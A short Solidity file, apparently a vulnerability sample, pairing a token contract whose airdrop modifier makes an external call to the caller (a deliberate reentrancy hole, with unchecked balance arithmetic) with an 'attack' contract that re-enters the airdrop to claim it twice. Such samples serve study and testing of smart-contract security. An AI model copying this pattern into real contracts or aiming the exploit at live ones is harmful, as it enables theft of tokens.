pragma solidity ^0.8.26;

contract ModifierEntrancy {
    mapping (address => uint) public tokenBalance;
    string constant name = "Nu Token";
    uint public totalAirdrops;
    uint public constant AIRDROP_AMOUNT = 20;
    mapping(address => bool) public hasClaimedAirdrop;

    event AirdropClaimed(address indexed recipient, uint amount);
    event TokensTransferred(address indexed from, address indexed to, uint amount);

    function airDrop() public hasNoBalance supportsToken {
        unchecked {
            tokenBalance[msg.sender] += AIRDROP_AMOUNT;
        }
        totalAirdrops++;
        hasClaimedAirdrop[msg.sender] = true;
        emit AirdropClaimed(msg.sender, AIRDROP_AMOUNT);
    }

    function transferTokens(address to, uint amount) external {
        require(tokenBalance[msg.sender] >= amount, "Insufficient balance");
        unchecked {
            tokenBalance[msg.sender] -= amount;
            tokenBalance[to] += amount;
        }
        emit TokensTransferred(msg.sender, to, amount);
    }

    function getTokenBalance(address account) external view returns (uint) {
        return tokenBalance[account];
    }

    modifier supportsToken() {
        require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
        _;
    }

    modifier hasNoBalance {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns(bytes32) {
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32) {
        if(!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}